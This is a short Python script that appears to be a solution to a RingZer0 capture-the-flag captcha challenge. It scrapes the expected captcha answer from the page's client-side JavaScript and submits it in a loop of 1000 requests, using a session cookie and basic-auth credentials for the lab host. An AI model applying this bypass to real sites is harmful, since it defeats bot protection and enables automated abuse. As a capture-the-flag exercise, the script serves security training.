import re
from requests import get, post

def main():
    cookies = dict(PHPSESSID = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
    headers = {'Origin': 'http://captcha.ringzer0team.com:7421', 'Referer': 'http://captcha.ringzer0team.com:7421/form1.php', 'Content-Type': 'application/x-www-form-urlencoded'}
    url_get = "http://captcha:QJc9U6wxD4SFT0u@captcha.ringzer0team.com:7421/form1.php"
    url_post = "http://captcha:QJc9U6wxD4SFT0u@captcha.ringzer0team.com:7421/captcha1.php"
    url_captcha = "http://captcha:QJc9U6wxD4SFT0u@captcha.ringzer0team.com:7421/captcha/captchabroken.php?new"
    for i in range(0, 1000):
        html = get(url_get, cookies=cookies).content
        get(url_captcha, cookies=cookies).content
        m = re.search('if \(A == \"(\w+)\"\)\{', html)
        captcha = m.group(1)
        payload = ('captcha=%s' % captcha)
        html = post(url_post, cookies=cookies, data=payload, headers=headers).content
        print('Got CAPTCHA: %s' % captcha)
        print html

if __name__ == '__main__':
    main()
